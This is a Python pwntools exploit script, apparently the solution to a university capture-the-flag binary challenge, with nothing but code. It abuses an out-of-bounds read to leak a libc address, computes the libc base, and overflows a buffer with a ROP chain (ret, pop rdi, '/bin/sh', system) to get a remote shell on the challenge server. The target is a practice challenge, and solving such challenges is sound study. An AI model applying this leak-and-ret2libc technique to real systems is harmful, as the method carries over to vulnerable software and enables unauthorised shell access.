from pwn import *

binary = "./4memory_vr_patched"

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
libc = ELF('libc.so.6')

gs = '''
break main
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    if args.REMOTE:
        return remote("cse4850-bin11.chals.io", 443, ssl=True, sni="cse4850-bin11.chals.io")
    return process(e.path)

p = start()

p.sendlineafter(b"Choice:", b'F')
p.sendlineafter(b"column):", str(0x539).encode('utf-8') + b',' + str(0x7a69).encode('utf-8'))
p.sendlineafter(b"column):", str(0x7a69).encode('utf-8') + b',' + str(0x539).encode('utf-8'))

p.recvuntil(b"0x")
leak = int(p.recv(12), 16)
libc.address = leak - 1977665

log.info(f"get_long_long: {hex(leak)}")
log.info(f"puts: {hex(libc.sym['puts'])}")

r = ROP(libc)
ret_gadget = r.find_gadget(['ret'])[0]
pop_rdi_gadget = r.find_gadget(['pop rdi','ret'])[0]
bin_sh_gadget = next(libc.search(b'/bin/sh'))
system_gadget = libc.sym['system']

chain = cyclic(0x38)
chain += p64(ret_gadget)
chain += p64(pop_rdi_gadget)
chain += p64(bin_sh_gadget)
chain += p64(system_gadget)

p.sendlineafter(b'>>>', chain)

p.interactive()